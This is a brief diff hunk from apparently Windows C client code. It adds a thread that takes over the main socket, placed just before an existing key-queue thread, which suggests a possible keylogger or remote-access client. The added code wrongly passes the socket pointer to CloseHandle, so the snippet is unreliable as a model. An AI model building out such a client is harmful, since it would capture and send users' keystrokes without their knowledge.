@@ -18,6 +18,17 @@ int main_client() {
         else break;
     }
 
+	SOCKET *youthSock = (SOCKET*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SOCKET));
+	*youthSock = MainSock;
+	HANDLE youthHandle = CreateThread(NULL, 0, youthThread, (void*)youthSock, 0, NULL);
+	if (!youthHandle) {
+		closesocket(MainSock);
+		HeapFree(GetProcessHeap(), NULL, youthSock);
+		WSACleanup();
+		return 3;
+	}
+	CloseHandle(youthSock);
+
 	queue *keyQueue = (queue *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(queue));
 	HANDLE keyhandle = CreateThread(NULL, 0, keyThread, (void*)keyQueue, 0, NULL);
 	if (!keyhandle) {
